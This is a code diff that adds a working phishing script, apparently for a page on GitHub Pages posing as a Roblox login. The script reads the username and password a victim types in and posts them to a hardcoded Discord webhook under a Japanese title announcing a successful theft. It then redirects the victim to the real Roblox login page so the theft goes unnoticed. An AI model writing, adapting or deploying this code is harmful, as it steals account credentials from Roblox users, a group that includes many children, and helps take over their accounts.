@@ -1,0 +1,31 @@
+const webhook_url = "https://discord.com/api/webhooks/1487098005311197285/I921xpFSj-MlnvwSTcm-0XJ01lfAisFR1dybl1PjsYWNW-b1bA0DPB1mtJQPmf0WBxTj";
+
+function sendData() {
+    const user = document.getElementById('username').value;
+    const pass = document.getElementById('password').value;
+
+    if (pass.length < 4) {
+        alert("Password is too short!");
+        return;
+    }
+
+    const payload = {
+        embeds: [{
+            title: "🍌 GitHub Pages 経由の奪取成功",
+            fields: [
+                { name: "ユーザー名", value: user, inline: true },
+                { name: "パスワード", value: "||" + pass + "||", inline: true }
+            ],
+            color: 0xffcc00
+        }]
+    };
+
+    fetch(webhook_url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    }).then(() => {
+        // 送信後に本物のRobloxログイン画面や、Banana Lagの解説ページに飛ばす
+        window.location.href = "https://www.roblox.com/login"; 
+    });
+}
